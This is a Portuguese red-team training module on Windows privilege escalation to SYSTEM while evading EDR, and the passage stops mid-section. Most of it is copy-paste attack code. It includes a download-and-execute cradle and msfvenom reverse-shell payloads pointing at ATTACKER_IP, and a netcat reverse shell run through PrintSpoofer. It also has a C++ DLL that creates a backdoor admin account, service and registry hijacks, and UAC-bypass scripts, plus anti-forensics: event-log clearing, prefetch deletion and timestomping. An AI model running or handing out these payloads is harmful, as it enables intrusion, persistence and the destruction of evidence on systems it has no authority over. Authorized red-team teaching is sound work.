---
layout: cyber
section: pos-expl-windows
title: "Escalada de Privilégio no Windows"
---

# 02 - Escalada de Privilégio no Windows

## SYSTEM Sem Acionar EDR

LPE (Local Privilege Escalation) é o processo de elevar permissão de usuário restrito pra nível mais alto — tipicamente SYSTEM ou Administrator. Em red team, escalada é frequente quando acesso inicial vem de phishing (usuário comum), conta de serviço com privilégios mínimos via exploração de web app, ou usuário com acesso limitado.

Sem escalada, muitas técnicas pós-exploração ficam indisponíveis: dump de LSASS, instalação de serviço, modificação de configuração crítica, persistência robusta. MITRE ATT&CK: T1068 (Exploitation for PrivEsc), T1574 (Hijack Execution Flow), T1543 (Create or Modify System Process), T1548 (Abuse Elevation Control / UAC), T1134 (Access Token Manipulation).

O objetivo não é só obter SYSTEM — é obter SYSTEM sem acionar EDR/AV, sem gerar log suspeito, de forma reproduzível se a sessão cair, e deixando o mínimo de rastro.

---

## Hierarquia de Privilégios, UAC, Tokens

### Hierarquia de Privilégios no Windows

```
SYSTEM (LocalSystem)
    └── Acesso irrestrito ao sistema
    └── Não tem credenciais de rede próprias
    └── Representa o próprio OS
    
Administrator (Local)
    └── Membro do grupo local Administrators
    └── Com UAC: token filtrado (Medium Integrity)
    └── Sem UAC ou elevado: Full Token (High Integrity)
    
Domain Admin
    └── Membro do grupo Domain Admins
    └── Acesso irrestrito ao domínio
    
Usuário Padrão
    └── Medium Integrity Level
    └── Sem privilégios especiais
    
Conta de Serviço/AppPool
    └── Variável - pode ter SeImpersonatePrivilege
    └── Frequentemente usado como ponto inicial após exploração web
```

### Integrity Levels (Níveis de Integridade)

Windows usa um sistema de integridade herdado do Vista:
- **Low**: AppContainer, processos sandboxed (ex: Internet Explorer em modo protegido)
- **Medium**: Usuários padrão, tokens filtrados de administradores com UAC
- **High**: Processos elevados via UAC (Run as Administrator)
- **System**: Serviços do sistema, processos SYSTEM

O mecanismo de integridade funciona via Mandatory Integrity Control (MIC): o kernel compara o nível de integridade do processo de origem com o do objeto de destino antes de qualquer acesso. Um processo Medium não pode abrir handles de escrita em processos High — mesmo que o token tenha os privilégios correspondentes. Isso é diferente de DAC (Discretionary Access Control) onde o dono pode conceder acesso; MIC é mandatório e não pode ser sobrescrito por ACLs de objeto. O UAC essencialmente divide o token de um usuário Administrator em dois: um token filtrado de Medium integrity para uso normal, e um token de High integrity que só é ativado quando o usuário aprova a elevação no prompt UAC. A diferença prática para escalada de privilégio: se `ConsentPromptBehaviorAdmin < 5`, o prompt UAC pode ser bypassado sem interação do usuário — a elevação ocorre automaticamente para binários assinados da Microsoft ou aplicações confiáveis pelo Windows. Se o valor for 5 (padrão para workstations), UAC bypass requer técnicas que enganam o sistema a elevar código não-confiável sem prompt.

### Fluxo de Decisão para LPE

```
1. Verificar whoami /all
   ├── SeImpersonatePrivilege? → PrintSpoofer / JuicyPotatoNG / GodPotato
   ├── SeDebugPrivilege? → Dump LSASS, process injection em processos privilegiados
   ├── SeBackupPrivilege? → Ler qualquer arquivo, incluindo SAM/SYSTEM
   ├── SeRestorePrivilege? → Escrever qualquer arquivo
   ├── SeTakeOwnershipPrivilege? → Tomar posse de qualquer objeto
   └── Nenhum? → Verificar misconfigurations locais

2. Verificar misconfigurations
   ├── Unquoted Service Paths
   ├── Weak Service Permissions (ACL do serviço)
   ├── Weak Registry Permissions (autoruns)
   ├── AlwaysInstallElevated
   └── DLL Hijacking em processos privilegiados

3. Verificar UAC Level
   └── ConsentPromptBehaviorAdmin < 5? → UAC Bypass
```

---

## Na Prática

### PowerUp - Checklist Automatizado

PowerUp é o módulo de escalada de privilégio do PowerSploit. Verifica todas as misconfigurações comuns automaticamente:

```powershell
# Importar PowerUp
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')

# Executar todos os checks
Invoke-AllChecks

# Ou individualmente
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Get-ModifiableRegistryAutoRun
Get-ModifiableScheduledTaskFile
Invoke-PrivescAudit
```

**Interpretando o output do Invoke-AllChecks:**

Cada finding tem campos:
- `ServiceName`: Nome do serviço vulnerável
- `Path`: Caminho do executável (para unquoted paths, mostra onde colocar o payload)
- `ModifiablePath`: Caminho que pode ser modificado
- `StartName`: Conta que executa o serviço (SYSTEM é o alvo ideal)
- `AbuseFunction`: Como explorar (já fornece os passos exatos)

Exemplo de saída para unquoted path:
```
ServiceName    : VulnerableService
Path           : C:\Program Files\My App\vulnerable.exe
ModifiablePath : C:\Program Files\My App
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'VulnerableService' -Path 'C:\Program Files\My App\My.exe'
CanRestart     : True
```

---

## Exemplos de Código / Comandos

### 1. Unquoted Service Paths

**O que é**: Quando o caminho de um executável de serviço contém espaços mas não está entre aspas, o Windows tenta executar o binário em múltiplos locais antes de encontrar o correto.

**Exemplo**: Para o path `C:\Program Files\My Application\service.exe`, o Windows tenta:
1. `C:\Program.exe`
2. `C:\Program Files\My.exe`
3. `C:\Program Files\My Application\service.exe` (correto)

Se você conseguir escrever em qualquer um dos caminhos anteriores, seu executável será rodado como SYSTEM (se o serviço rodar como SYSTEM).

**Encontrando serviços vulneráveis:**

```cmd
wmic service get name,pathname,startname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Explicação: Filtra serviços que NÃO estão em C:\Windows (que seria benigno) e NÃO têm aspas no path. O que sobra são candidatos.

```powershell
# Via PowerShell com mais detalhes
Get-WmiObject -Class Win32_Service | 
    Where-Object {
        $_.PathName -ne $null -and 
        $_.PathName -notmatch "^`"" -and 
        $_.PathName -match " "
    } | Select-Object Name, PathName, StartName

# Via PowerUp
Get-UnquotedService
```

**Exploitando:**

```powershell
# Verificar permissão de escrita no caminho parcial
icacls "C:\Program Files\My Application"
# Procurar por: (Everyone)(F) ou (Users)(W) ou (BUILTIN\Users)(W)

# Criar payload MSF
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o My.exe

# Copiar para o path parcial vulnerável
copy My.exe "C:\Program Files\My.exe"

# Reiniciar o serviço (se tiver permissão)
sc stop VulnerableService
sc start VulnerableService

# Ou aguardar reinicialização do sistema
# Ou usar PowerUp diretamente
Write-ServiceBinary -Name 'VulnerableService' -Path 'C:\Program Files\My.exe'
```

**Nota OPSEC**: Colocar um executável em `C:\Program Files\` é suspeito. EDRs modernos fazem hashing de executáveis em caminhos de serviço. Considere usar um payload em memória ou um stager mínimo.

---

### 2. Weak Service Permissions

**O que é**: O próprio objeto de serviço (no SCM - Service Control Manager) tem uma ACL. Se essa ACL permite que seu usuário modifique o serviço, você pode alterar o `binPath` para seu payload.

**Verificando ACLs de serviço:**

```cmd
# sc sdshow mostra a Security Descriptor do serviço
sc sdshow VulnerableService
```

A saída é um SDDL (Security Descriptor Definition Language). É difícil de ler diretamente. Use accesschk:

```cmd
# accesschk.exe da Sysinternals
accesschk.exe -uwcqv "DOMAIN\yourusername" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *

# Verificar um serviço específico
accesschk.exe -uwcqv VulnerableService

# Verificar todos os serviços onde você tem permissão de escrita
accesschk.exe -uwcqv "Users" * /accepteula
```

**Saída que interessa:**
```
RW VulnerableService
    SERVICE_ALL_ACCESS
```
ou
```
RW VulnerableService
    SERVICE_CHANGE_CONFIG
    SERVICE_START
    SERVICE_STOP
```

`SERVICE_CHANGE_CONFIG` é suficiente para alterar o `binPath`.

**Exploitando:**

```cmd
# Verificar configuração atual do serviço
sc qc VulnerableService

# Modificar binPath para executar nosso comando
sc config VulnerableService binPath= "cmd /c net localgroup administrators DOMAIN\lowprivuser /add"

# Reiniciar o serviço
sc stop VulnerableService
sc start VulnerableService

# Verificar se funcionou
net localgroup administrators

# Opcional: restaurar binPath original para cobrir rastros
sc config VulnerableService binPath= "C:\original\path\service.exe"
```

Via PowerUp:
```powershell
# PowerUp automatiza isso
Invoke-ServiceAbuse -Name 'VulnerableService' -UserName 'DOMAIN\lowprivuser'

# Ou executar um comando arbitrário
Invoke-ServiceAbuse -Name 'VulnerableService' -Command "net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add"
```

---

### 2b. Service DLL Hijacking

**Quando usar**: Quando NÃO tem permissão para sobrescrever o binário do serviço (apenas RX), mas o serviço carrega DLLs de paths onde você consegue escrever.

**Princípio**: Windows segue uma **search order** ao resolver uma DLL pelo nome (sem path absoluto). Se o serviço pede `myDLL.dll` e essa DLL não existe nos primeiros paths da search order — mas você pode escrever em algum deles — sua DLL maliciosa é carregada.

#### DLL Search Order (Safe DLL Search Mode habilitado — default)

```
1. Diretório do executável do serviço
2. C:\Windows\System32
3. C:\Windows\System (16-bit)
4. C:\Windows
5. Diretório de trabalho atual (CWD)
6. Diretórios do PATH
```

Com **safe mode desabilitado**, CWD sobe para posição 2 — historicamente o vetor primário.

#### Identificar DLL Faltando com Process Monitor

```cmd
# 1. Verificar permissão no binário do serviço
icacls "C:\Users\steve\Documents\BetaServ.exe"
# Se NÃO tiver (F) ou (W) → tentar DLL hijacking

# 2. Reiniciar o serviço enquanto Procmon roda como admin
# (na prática: copiar binário para lab local — Procmon precisa admin)
Restart-Service BetaService

# 3. Filtrar Process Monitor:
#    Process Name is BetaServ.exe → Include
#    Operation is CreateFile → Include

# 4. Procurar entradas com Result "NAME NOT FOUND"
# Exemplo:
# BetaServ.exe  CreateFile  C:\Users\steve\Documents\myDLL.dll  NAME NOT FOUND
# BetaServ.exe  CreateFile  C:\Windows\System32\myDLL.dll        NAME NOT FOUND
# BetaServ.exe  CreateFile  C:\Windows\myDLL.dll                 NAME NOT FOUND
# ...
```

Primeiro path = diretório da app (`C:\Users\steve\Documents\`). Como `steve` controla seu próprio home dir → DLL maliciosa entregue antes dos paths do sistema.

#### Forjar DLL Maliciosa

DLL precisa exportar `DllMain` com case `DLL_PROCESS_ATTACH` — executado quando processo carrega a DLL:

```cpp
// myDLL.cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("net user dave2 password123! /add");
            system("net localgroup administrators dave2 /add");
            break;
        case DLL_THREAD_ATTACH: break;
        case DLL_THREAD_DETACH: break;
        case DLL_PROCESS_DETACH: break;
    }
    return TRUE;
}
```

Cross-compile no Kali (mingw com `--shared` produz DLL):

```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

#### Disparar

```powershell
# Transferir para o primeiro path da search order
cd C:\Users\steve\Documents
iwr -uri http://KALI/myDLL.dll -OutFile myDLL.dll

# Verificar que o nome casa exatamente com o NAME NOT FOUND identificado

# Restart do serviço dispara LoadLibrary → DllMain executa como SYSTEM
Restart-Service BetaService

# Confirmar
net user dave2
net localgroup administrators
```

**Por que funciona**: serviço roda como SYSTEM (ou outro principal privilegiado) → `system()` em `DllMain` herda esse contexto. Backdoor user criado com nível de privilégio do serviço.

**OPSEC**: 
- `DllMain` em DLL legítima raramente executa `system()` — EDRs flagam essa combinação
- Preferir `CreateProcessW` direto ou injection inline no `DLL_PROCESS_ATTACH`
- DLL com seção `.text` muito pequena + import de `system` = assinatura óbvia
- Limpar DLL após exploit (serviço pode tentar recarregar e falhar)

---

### 3. AlwaysInstallElevated

**O que é**: Uma política de grupo que, quando habilitada em HKCU E HKLM, permite que qualquer usuário instale arquivos MSI com privilégios SYSTEM.

**Por que existe**: Projetado para ambientes onde usuários precisam instalar software sem ter privilégios de admin. Na prática, é uma misconfiguration clássica.

**Verificando:**

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Ambas precisam retornar `0x1` para ser vulnerável.

```powershell
# Via PowerUp
Get-RegistryAlwaysInstallElevated
```

**Criando MSI malicioso:**

```bash
# No atacante (Kali/Linux)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o evil.msi

# MSI com adição de usuário (mais simples, sem depender de listener)
msfvenom -p windows/exec CMD="net user evil P@ssw0rd /add && net localgroup administrators evil /add" -f msi -o adduser.msi
```

**Executando no alvo:**

```cmd
# No alvo Windows
msiexec /quiet /qn /i evil.msi
```

O `/quiet` e `/qn` suprimem interfaces gráficas. O MSI será executado como SYSTEM.

Via PowerUp:
```powershell
# PowerUp automatiza a criação e execução
Write-UserAddMSI  # Cria MSI que adiciona usuário
Invoke-AllChecks  # Detecta automaticamente e sugere exploit
```

---

### 4. UAC Bypass Detalhado

#### UAC Internals — Admin Approval Mode

Todo usuário no grupo Administrators recebe **dois tokens** no logon:

```
Logon → LSA cria token elevado (High Integrity, Full token)
      → LSA filtra uma cópia → token filtrado (Medium Integrity, stripped privileges)

Token filtrado:  usado por padrão (Explorer, processos normais)
Token elevado:   entregue apenas após elevação via Consent.exe
```

O serviço `AIS (AppInfo Service)` gerencia elevações. Quando um processo requer elevation:
```
Processo → ShellExecute(..., "runas", ...) → AIS
AIS → verifica manifesto do binário (requestedExecutionLevel)
AIS → lança Consent.exe na Secure Desktop (WinSta0\Winlogon)
Usuário confirma → AIS cria processo com token elevado
```

**Auto-Elevation** — bypass sem prompt quando TODAS as 4 condições forem verdadeiras:
1. Binário assinado pela Microsoft (verificação de certificado)
2. Localizado em `%SystemRoot%\` (System32 ou subdirs)
3. Manifesto contém `requestedExecutionLevel = requireAdministrator` ou `highestAvailable`
4. Manifesto contém `<autoElevate>true</autoElevate>`

```powershell
# Verificar se binário tem autoElevate
sigcheck.exe -m C:\Windows\System32\fodhelper.exe | findstr autoElevate
# ou com Sysinternals sigcheck64
sigcheck64.exe -m fodhelper.exe
```

**Registro UAC — valores chave:**

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

ConsentPromptBehaviorAdmin:
  0 = Eleva sem prompt (bypass total — EnableLUA=1 mas sem verificação)
  1 = Prompt em Secure Desktop com credenciais de admin
  2 = Prompt em Secure Desktop confirmação apenas
  3 = Prompt (não Secure Desktop) com credenciais
  4 = Prompt (não Secure Desktop) confirmação
  5 = Prompt em Secure Desktop confirmação (DEFAULT)

EnableLUA:
  0 = UAC desabilitado — admins recebem token elevado direto no logon
  1 = UAC ativo (default)

PromptOnSecureDesktop:
  0 = Prompt não usa Secure Desktop (susceptível a captura de input por outro processo)
  1 = Secure Desktop (default — isola o prompt)

LocalAccountTokenFilterPolicy:
  1 = Desabilita UAC Remote Restrictions — PtH funciona para qualquer admin local
  0 = Padrão — PtH só funciona para RID 500 (Administrator built-in)
```

**Verificando:**

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy
```

Para bypass de UAC funcionar, você precisa ser membro do grupo Administrators. UAC bypass não eleva um usuário comum — apenas bypassa o prompt para admins que já têm token filtrado.

#### 4a. fodhelper.exe Bypass

`fodhelper.exe` é um binário marcado como auto-elevate (ele eleva automaticamente sem UAC prompt). Ele lê a registry em `HKCU\Software\Classes\ms-settings\shell\open\command` antes de executar.

```powershell
# Criar a chave registry em HKCU (sem necessidade de admin)
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "(Default)" -Value "cmd /c start cmd.exe" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" `
    -Name "DelegateExecute" -Value "" -Force

# Executar fodhelper.exe (vai abrir cmd.exe elevado)
Start-Process "C:\Windows\System32\fodhelper.exe"

# Limpar após uso (OPSEC)
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

#### 4b. computerdefaults.exe Bypass

Similar ao fodhelper, mas usa `computer\HKEY_CLASSES_ROOT\ms-settings`:

```powershell
$regPath = "HKCU:\Software\Classes\ms-settings\shell\open\command"
New-Item -Path $regPath -Force
New-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
New-ItemProperty -Path $regPath -Name "(Default)" -Value "cmd.exe" -Force
Start-Process "$env:windir\System32\computerdefaults.exe"
Start-Sleep 3
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force
```

#### 4c. eventvwr.exe Bypass

`eventvwr.exe` abre o Event Viewer e é auto-elevate. Ele carrega `HKCU\Software\Classes\mscfile\shell\open\command` antes de abrir o MMC snap-in:

```cmd
REM CMD version
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\mscfile\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f
start /B eventvwr.exe
timeout 3
reg delete HKCU\Software\Classes\mscfile /f
```

#### 4d. CMSTPLUA COM Object

A interface COM `CMSTPLUA` (CMSTP - Connection Manager Setup Tool) tem auto-elevate e pode ser abusada para executar código elevado:

```powershell
$Bypass = @"
using System;
using System.Runtime.InteropServices;

public class CMSTPLUA {
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    public static void Elevate(string command) {
        // Usar ShellExecute via COM auto-elevate CMSTPLUA
        var shell = Activator.CreateInstance(Type.GetTypeFromCLSID(
            new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7")));
        var shellType = shell.GetType();
        shellType.InvokeMember("ShellExecute", 
            System.Reflection.BindingFlags.InvokeMethod, null, shell,
            new object[] { command, "", "", "open", 1 });
    }
}
"@

Add-Type $Bypass
[CMSTPLUA]::Elevate("cmd.exe /c whoami > C:\Temp\elevated.txt")
```

#### Ferramenta: UACME

O repositório UACME documenta dezenas de métodos de bypass:
```
https://github.com/hfiref0x/UACME
```

Para uso em red team, o Cobalt Strike `elevate` agrega vários métodos:
```
# No Cobalt Strike
elevate uac-token-duplication [listener]
elevate uac-schtasks [listener]
```

---

### 5. SeImpersonatePrivilege - Potato Attacks

**Por que SeImpersonate permite escalada:**

O `SeImpersonatePrivilege` permite que um processo impersone tokens de outros usuários depois de eles se autenticarem. O fluxo é:

1. Criar um Named Pipe servidor
2. Induzir o serviço SYSTEM a conectar no Named Pipe (usando diversas técnicas)
3. Quando o serviço conecta ao pipe, você captura o token de autenticação
4. Usar `ImpersonateNamedPipeClient()` para assumir a identidade do token SYSTEM
5. Executar código com o token SYSTEM impersonado

Contas que tipicamente têm SeImpersonatePrivilege:
- `NT AUTHORITY\NETWORK SERVICE`
- `NT AUTHORITY\LOCAL SERVICE`
- IIS Application Pools
- SQL Server service accounts
- Qualquer conta de serviço configurada pelo admin com este privilégio

#### PrintSpoofer

Funciona no Windows Server 2016, 2019, Windows 10 (versões mais antigas). Usa o Windows Print Spooler para forçar conexão de SYSTEM ao pipe:

```cmd
# Executar cmd.exe como SYSTEM
PrintSpoofer.exe -i -c cmd.exe

# Executar um comando específico
PrintSpoofer.exe -c "whoami > C:\Temp\whoami.txt"

# Reverso shell
PrintSpoofer.exe -c "C:\Temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

#### JuicyPotatoNG

Evolução do JuicyPotato. Usa COM activation para obter token SYSTEM:

```cmd
# JuicyPotatoNG (requer Windows 10 1809+ ou Server 2019+)
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"

# Com CLSID específico (se o padrão falhar)
JuicyPotatoNG.exe -t * -p cmd.exe -a "/c net user evil P@ss /add" -l 9999

# Listar CLSIDs disponíveis para tentar
JuicyPotatoNG.exe --list
```

#### GodPotato

Mais recente, funciona em todas as versões do Windows de 2012 a 2022:

```cmd
# Executar comando como SYSTEM
GodPotato.exe -cmd "whoami"
GodPotato.exe -cmd "net user evil P@ssw0rd /add && net localgroup administrators evil /add"

# Reverse shell
GodPotato.exe -cmd "C:\Temp\payload.exe"
```

**Quando usar cada um:**

| Ferramenta | Windows Versions | Requisitos Adicionais |
|-----------|-----------------|----------------------|
| PrintSpoofer | Server 2016/2019, Win10 | Print Spooler service ativo |
| JuicyPotatoNG | Win10 1809+, Server 2019+ | DCOM, COM servidor ativo |
| GodPotato | Win2012 até Win2022 | Mais universal |
| SweetPotato | Múltiplas versões | Combina múltiplas técnicas |
| RoguePotato | Quando outros falham | Precisa de redirecionamento de porta |

---

### 6. Weak Registry Permissions (Autoruns)

Programas que iniciam automaticamente via registry podem ter permissões fracas na chave de registry, permitindo modificação do caminho para um payload:

```powershell
# Encontrar chaves de autorun com permissões modificáveis
$autorunPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SYSTEM\CurrentControlSet\Services"
)

foreach ($path in $autorunPaths) {
    $acl = Get-Acl -Path $path -ErrorAction SilentlyContinue
    if ($acl) {
        $acl.Access | Where-Object {
            $_.IdentityReference -notmatch "SYSTEM|Administrators|TrustedInstaller" -and
            $_.RegistryRights -match "FullControl|WriteKey|SetValue"
        } | ForEach-Object {
            Write-Output "VULNERÁVEL: $path"
            Write-Output "  Principal: $($_.IdentityReference)"
            Write-Output "  Direitos: $($_.RegistryRights)"
        }
    }
}
```

Via PowerUp:
```powershell
Get-ModifiableRegistryAutoRun
```

**Exploitando:**

```powershell
# Se você tem permissão de escrita na chave de autorun
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name "LegitApp" -Value "C:\Temp\payload.exe"

# Ou modificar o valor existente de um programa legítimo
$currentValue = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "VulnerableApp"
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
    -Name "VulnerableApp" -Value "C:\Temp\payload.exe"
```

---

## Detecção e OPSEC

### O Que o Defender/EDR Monitora

**AlwaysInstallElevated:**
- Windows Defender alerta nativamente para MSI executados com privilégio elevado
- Event ID 1033 (MSI install) no Application log
- Sysmon Event 1 com `msiexec.exe` como parent

**Potato Attacks:**
- PrintSpoofer: `SpoolSv.exe` criando Named Pipe e sendo conectado é monitorado por EDRs modernos
- JuicyPotato/GodPotato: Ativação de CLSID COM suspeita é detectada por Microsoft Defender for Endpoint
- Recomendação: Use via BOF (Beacon Object File) em vez de executável separado

**UAC Bypass:**
- Criação de chaves de registry em `HKCU:\Software\Classes` é monitorada
- fodhelper.exe abrindo processos filho (cmd.exe) é anomalia detectável
- UACME: muitos métodos são assinados por AV/EDR

**Unquoted Paths:**
- Colocar executável em `C:\Program Files\` sem instalador MSI é suspeito
- Hash do executável será verificado contra bases de reputação

### Estratégias de OPSEC

```powershell
# 1. Preferir BOFs a executáveis separados (quando usando C2)
# 2. Para potato attacks, usar implementação via reflective loading
# 3. Limpar artefatos de registry após UAC bypass:
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force

# 4. Verificar exclusões do Defender antes de dropar ferramentas
Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess

# 5. Usar caminhos excluídos se disponíveis
# 6. Preferir técnicas sem disco quando possível (shellcode injection)
```

### Cobrindo Rastros

```cmd
REM Limpar logs de eventos (requer admin)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

REM Limpar prefetch (pode indicar execução de ferramentas)
del /Q C:\Windows\Prefetch\*.pf

REM Limpar timestamps de arquivos (timestomping)
REM Via PowerShell
$file = Get-Item "C:\Temp\tool.exe"
$file.CreationTime = "01/01/2020 12:00:00"
$file.LastWriteTime = "01/01/2020 12:00:00"
$file.LastAccessTime = "01/01/2020 12:00:00"
```

**Atenção**: Limpar logs é um TTP altamente monitorado (T1070.001). Em ambientes com SIEM, os logs já foram encaminhados antes de você limpá-los. A ação de limpar em si gera alerta.

---

## Módulos Relacionados

`01_enumeracao_e_situational_awareness.md` é pré-requisito — `whoami /all` define quais técnicas de privilégio são aplicáveis. `03_credenciais_windows.md` é o passo seguinte (LSASS + SAM dump após SYSTEM). `04_token_impersonation.md` cobre `steal_token` em processos de outros usuários. `05_persistencia.md` aproveita privilégio elevado pra HKLM (afeta todos os usuários).

---

## Leitura Complementar

- PowerUp — https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- PrintSpoofer — https://github.com/itm4n/PrintSpoofer
- JuicyPotatoNG — https://github.com/antonioCoco/JuicyPotatoNG
- GodPotato — https://github.com/BeichenDream/GodPotato
- UACME — https://github.com/hfiref0x/UACME
- accesschk — https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk

---

## Técnicas MalTrak - Módulo 07

### Privilege Escalation - Visão Profunda

O Módulo 07 do MalTrak aprofunda a escalada de privilégios em Windows, cobrindo os três níveis de integridade, bypass de UAC, e técnicas clássicas de escalada.

#### Por Que Escalada de Privilégios é Necessária

Objetivos que requerem privilégios elevados (High Integrity / SYSTEM):
- Acessar senhas em memória com **Mimikatz** (requer acesso ao `lsass.exe`)
- Tomar controle de Domain Controllers
- Desabilitar serviços de segurança (AV, EDR, firewall)
- Instalar persistência em `HKLM` (afeta todos os usuários do sistema)
- Instalar drivers no kernel

---

### Três Níveis de Integridade do Windows

O Windows implementa **Mandatory Integrity Control (MIC)** com três níveis principais:

| Nível | Nome | Descrição |
|-------|------|-----------|
| Alto | **High Integrity** | Acesso administrativo completo |
| Médio | **Medium Integrity** | Acesso padrão de usuário |
| Baixo | **Low Integrity** | Acesso restrito (ex: sandbox de browser) |

#### Restrições do Medium Integrity

Com Medium Integrity (usuário padrão), o atacante NAO consegue:
- Escrever em `C:\Windows`, `C:\Program Files`, `C:\Windows\System32`
- Escrever em `HKEY_LOCAL_MACHINE` (somente leitura em algumas chaves)
- Acessar o SAM (banco de senhas local)
- Acessar processos protegidos e sua memória
- Acessar credenciais em memória no processo `lsass.exe`
- Instalar driver de modo kernel
- Desabilitar firewall ou antivírus

---

### Bypass de UAC (Medium -> High Integrity)

**UAC (User Access Control)** é o mecanismo que impede escalada automática de Medium para High Integrity. O atacante não pode clicar "Sim" no prompt UAC pois não tem acesso à GUI.

**Configuracoes do UAC:**
1. **Always Prompt** (mais seguro): sempre pede confirmacao
2. **Default Settings**: prompt apenas para apps nao-assinadas
3. **Don't Prompt** (desabilitado): sem protecao UAC

#### Conceito de AutoElevation

No setting padrao do UAC, processos **assinados** localizados em `system32` podem ser **AutoElevados** automaticamente (sem prompt). Esses apps rodam com High Integrity. Qualquer DLL carregada no espaco deles ou app executado por eles também herda High Integrity.

**Ferramenta para identificar apps AutoElevados:**
```
sigcheck.exe -a -m <caminho_do_exe>
```
Procurar por:
```xml
<requestedExecutionLevel level="highestAvailable" uiAccess="false"/>
<autoElevate>true</autoElevate>
```

---

#### Bypass UAC 01: Event Viewer (eventvwr.exe) - T1548.002

**Como funciona:**
- `eventvwr.exe` é AutoElevado (roda com High Integrity)
- Ele executa comandos registrados em:
  ```
  HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command
  ```
- Qualquer comando escrito lá é executado com privilégios elevados pelo `eventvwr.exe`
- Esta chave PODE ser escrita com Medium Integrity (HKCU)

**Passos:**
1. Escrever caminho do malware em `HKCU\Software\Classes\mscfile\shell\open\command`
2. Executar `eventvwr.exe`
3. O malware é executado com High Integrity

**Referência:** https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/

---

#### Bypass UAC 02: Fodhelper.exe - T1548.002

**Como funciona:**
- `fodhelper.exe` é AutoElevado
- Executa comandos em:
  ```
  HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open\command
  ```
- Também requer o valor `DelegateExecute` na mesma chave
- HKCU pode ser escrito com Medium Integrity

**Implementacao em PowerShell:**
```powershell
# Criar estrutura de registro
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

# Executar o bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```

**Fonte:** https://github.com/winscripting/UAC-bypass/blob/master/FodhelperBypass.ps1

---

#### Outros Processos AutoElevados para UAC Bypass - T1548.002

Mesma técnica aplicável a outros processos:
- **slui.exe**: semelhante ao fodhelper
- **sdclt.exe**: semelhante ao fodhelper

Outros requerem mecanismos diferentes:
- **Via variáveis de ambiente**: .Net Profiler
- **COM Hijacking**: algumas técnicas usam CLSID específicos

**OPSEC:** Com configuracao **AlwaysNotify**, a grande maioria dessas técnicas NAO funciona. Verificar nível de UAC antes de tentar.

**Repositório de referência - UACME:**
- https://github.com/hfiref0x/UACME
- Mantém lista atualizada de técnicas de bypass UAC
- Mais de 60 técnicas documentadas

---

### Escalada de Médio para SYSTEM (Privilege Escalation Real)

As técnicas abaixo NAO dependem de processos AutoElevados. Escalam de Low/Medium para High/SYSTEM.

#### T1574.010 - Writable Service Path (Servico com Caminho Gravável)

**Conceito:**
- Servicos do Windows sempre rodam com High Integrity (SYSTEM ou Local Service)
- Se o arquivo de servico (`.exe` ou `.dll`) estiver em um caminho gravável, o atacante pode substituí-lo

**Fluxo de ataque:**
